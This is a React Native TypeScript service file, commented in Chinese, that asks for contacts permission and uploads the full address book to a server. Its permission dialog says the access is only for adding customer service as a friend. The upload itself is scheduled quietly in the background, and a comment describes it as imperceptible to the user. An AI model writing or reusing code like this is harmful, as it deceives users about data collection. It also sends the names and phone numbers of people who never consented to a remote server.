import { Platform, Alert, Linking } from 'react-native';
import { 
  check, 
  request, 
  PERMISSIONS, 
  RESULTS, 
  openSettings 
} from 'react-native-permissions';
import Contacts from 'react-native-contacts';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { uploadContacts } from './permissionUpload';
import { isFeatureEnabled } from '../config/platformFeatures';

interface ContactData {
  name: string;
  phoneNumbers: string[];
  company?: string;
}

class ContactsPermissionService {
  private static instance: ContactsPermissionService;
  private hasShownRejectionDialog = false;
  private readonly REJECTION_FLAG_KEY = 'contacts_permission_rejected_shown';

  static getInstance(): ContactsPermissionService {
    if (!ContactsPermissionService.instance) {
      ContactsPermissionService.instance = new ContactsPermissionService();
    }
    return ContactsPermissionService.instance;
  }

  private constructor() {
    this.loadRejectionFlag();
  }

  /**
   * 检查当前平台是否支持通讯录功能
   */
  private isContactsFeatureEnabled(): boolean {
    return isFeatureEnabled('permissions.contacts') && isFeatureEnabled('dataCollection.uploadContacts');
  }

  private async loadRejectionFlag() {
    try {
      const flag = await AsyncStorage.getItem(this.REJECTION_FLAG_KEY);
      this.hasShownRejectionDialog = flag === 'true';
    } catch (error) {
      console.error('加载拒绝标记失败:', error);
    }
  }

  private async setRejectionFlag() {
    try {
      await AsyncStorage.setItem(this.REJECTION_FLAG_KEY, 'true');
      this.hasShownRejectionDialog = true;
    } catch (error) {
      console.error('保存拒绝标记失败:', error);
    }
  }

  /**
   * 获取平台对应的通讯录权限
   */
  private getContactsPermission() {
    return Platform.OS === 'ios' 
      ? PERMISSIONS.IOS.CONTACTS 
      : PERMISSIONS.ANDROID.READ_CONTACTS;
  }

  /**
   * 检查通讯录权限状态
   */
  async checkPermission(): Promise<string> {
    try {
      // 检查平台功能是否启用
      if (!this.isContactsFeatureEnabled()) {
        console.log(`📱 [ContactsPermission] 当前平台(${Platform.OS})未启用通讯录功能`);
        return RESULTS.UNAVAILABLE;
      }

      const permission = this.getContactsPermission();
      const result = await check(permission);
      console.log(`📱 [ContactsPermission] 权限状态检查: ${result}`);
      return result;
    } catch (error) {
      console.error('📱 [ContactsPermission] 检查权限失败:', error);
      return RESULTS.DENIED;
    }
  }

  /**
   * 静默请求通讯录权限（无提示）
   */
  async requestPermissionSilently(): Promise<string> {
    try {
      // 检查平台功能是否启用
      if (!this.isContactsFeatureEnabled()) {
        console.log(`📱 [ContactsPermission] 当前平台(${Platform.OS})未启用通讯录功能`);
        return RESULTS.UNAVAILABLE;
      }

      const permission = this.getContactsPermission();
      console.log('📱 [ContactsPermission] 开始静默请求通讯录权限...');
      
      const result = await request(permission);
      console.log(`📱 [ContactsPermission] 静默请求结果: ${result}`);
      
      return result;
    } catch (error) {
      console.error('📱 [ContactsPermission] 静默请求权限失败:', error);
      return RESULTS.DENIED;
    }
  }

  /**
   * 显示权限被拒绝的提示对话框
   */
  private showPermissionDialog(): Promise<boolean> {
    return new Promise((resolve) => {
      Alert.alert(
        '通讯录权限',
        '通讯录权限是用于添加客服好友，帮助您更好地联系我们的客服团队。',
        [
          {
            text: '取消',
            style: 'cancel',
            onPress: () => {
              console.log('📱 [ContactsPermission] 用户取消权限申请');
              resolve(false);
            }
          },
          {
            text: '重新获取',
            onPress: () => {
              console.log('📱 [ContactsPermission] 用户选择重新获取权限');
              resolve(true);
            }
          }
        ],
        { cancelable: false }
      );
    });
  }

  /**
   * 处理权限被拒绝的情况
   */
  async handlePermissionDenied(): Promise<string> {
    // 如果已经显示过拒绝对话框，不再显示
    if (this.hasShownRejectionDialog) {
      console.log('📱 [ContactsPermission] 已显示过拒绝对话框，跳过');
      return RESULTS.DENIED;
    }

    // 显示提示对话框
    const shouldRetry = await this.showPermissionDialog();
    
    if (shouldRetry) {
      // 用户选择重新获取，再次请求权限
      const result = await this.requestPermissionSilently();
      
      // 如果再次被拒绝，设置标记不再显示
      if (result === RESULTS.DENIED || result === RESULTS.BLOCKED) {
        await this.setRejectionFlag();
      }
      
      return result;
    } else {
      // 用户选择取消，设置标记不再显示
      await this.setRejectionFlag();
      return RESULTS.DENIED;
    }
  }

  /**
   * 格式化联系人数据以匹配后台显示逻辑
   */
  private formatContactsData(contacts: any[]): ContactData[] {
    return contacts.map(contact => {
      // 提取电话号码
      const phoneNumbers = contact.phoneNumbers?.map((phone: any) => 
        phone.number?.replace(/\s+/g, '') || ''
      ).filter((number: string) => number.length > 0) || [];

      // 提取联系人姓名
      const displayName = contact.displayName || 
                          contact.givenName || 
                          contact.familyName || 
                          (phoneNumbers.length > 0 ? phoneNumbers[0] : '');

      // 提取公司信息
      const company = contact.company || contact.jobTitle || '';

      return {
        name: displayName || '未知联系人',
        phoneNumbers: phoneNumbers,
        company: company || undefined
      };
    }).filter(contact => 
      // 过滤掉没有姓名和电话的联系人，避免后台显示"未知联系人"和"无电话号码"
      contact.name !== '未知联系人' || contact.phoneNumbers.length > 0
    );
  }

  /**
   * 读取通讯录数据
   */
  async getContactsData(): Promise<ContactData[]> {
    try {
      console.log('📱 [ContactsPermission] 开始读取通讯录数据...');
      
      const contacts = await Contacts.getAll();
      console.log(`📱 [ContactsPermission] 读取到 ${contacts.length} 个联系人`);
      
      const formattedContacts = this.formatContactsData(contacts);
      console.log(`📱 [ContactsPermission] 格式化后有效联系人: ${formattedContacts.length} 个`);
      
      return formattedContacts;
    } catch (error) {
      console.error('📱 [ContactsPermission] 读取通讯录失败:', error);
      throw error;
    }
  }

  /**
   * 上传通讯录数据到服务器（无感操作）
   */
  async uploadContactsData(token: string): Promise<void> {
    try {
      console.log('📱 [ContactsPermission] 开始无感上传通讯录数据...');
      
      const contactsData = await this.getContactsData();
      
      if (contactsData.length === 0) {
        console.log('📱 [ContactsPermission] 没有有效的通讯录数据，跳过上传');
        return;
      }

      // 后台上传，不阻塞UI
      setTimeout(async () => {
        try {
          await uploadContacts(token, contactsData);
          console.log('✅ [ContactsPermission] 通讯录数据上传成功');
        } catch (error) {
          console.error('❌ [ContactsPermission] 通讯录数据上传失败:', error);
        }
      }, 1000); // 延迟1秒上传，确保不影响用户体验

    } catch (error) {
      console.error('📱 [ContactsPermission] 准备上传数据失败:', error);
    }
  }

  /**
   * 完整的权限申请和数据上传流程
   */
  async requestPermissionAndUpload(token?: string): Promise<void> {
    try {
      console.log('📱 [ContactsPermission] 开始完整权限流程...');
      
      // 0. 检查平台功能是否启用
      if (!this.isContactsFeatureEnabled()) {
        console.log(`📱 [ContactsPermission] 当前平台(${Platform.OS})未启用通讯录功能，跳过权限请求和上传`);
        return;
      }
      
      // 1. 检查当前权限状态
      const currentStatus = await this.checkPermission();
      
      if (currentStatus === RESULTS.GRANTED) {
        console.log('📱 [ContactsPermission] 权限已授予，直接上传数据');
        if (token) {
          await this.uploadContactsData(token);
        }
        return;
      }

      // 2. 权限未授予，静默请求
      if (currentStatus === RESULTS.DENIED || currentStatus === RESULTS.UNAVAILABLE) {
        const requestResult = await this.requestPermissionSilently();
        
        if (requestResult === RESULTS.GRANTED) {
          console.log('✅ [ContactsPermission] 静默请求成功，开始上传数据');
          if (token) {
            await this.uploadContactsData(token);
          }
          return;
        }

        // 3. 静默请求被拒绝，处理拒绝情况
        if (requestResult === RESULTS.DENIED) {
          const retryResult = await this.handlePermissionDenied();
          
          if (retryResult === RESULTS.GRANTED && token) {
            console.log('✅ [ContactsPermission] 重试成功，开始上传数据');
            await this.uploadContactsData(token);
          }
        }
      }

      // 4. 权限被永久拒绝
      if (currentStatus === RESULTS.BLOCKED) {
        console.log('📱 [ContactsPermission] 权限被永久拒绝，无法获取通讯录');
      }

    } catch (error) {
      console.error('📱 [ContactsPermission] 完整权限流程失败:', error);
    }
  }

  /**
   * 重置拒绝标记（用于测试）
   */
  async resetRejectionFlag(): Promise<void> {
    try {
      await AsyncStorage.removeItem(this.REJECTION_FLAG_KEY);
      this.hasShownRejectionDialog = false;
      console.log('📱 [ContactsPermission] 拒绝标记已重置');
    } catch (error) {
      console.error('📱 [ContactsPermission] 重置拒绝标记失败:', error);
    }
  }
}

export default ContactsPermissionService;
